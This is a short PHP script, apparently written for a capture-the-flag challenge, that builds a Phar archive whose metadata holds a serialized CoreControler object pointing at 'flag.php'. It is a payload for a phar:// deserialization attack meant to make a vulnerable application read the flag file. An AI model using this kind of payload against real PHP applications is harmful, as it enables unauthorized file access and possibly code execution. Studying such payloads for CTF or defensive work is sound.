<?php
// create new Phar
$phar = new Phar('lala.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class CoreControler {
	public $CoreFile;
}

$object = new CoreControler;
$object->CoreFile = 'flag.php';
$phar->setMetadata($object);
$phar->stopBuffering();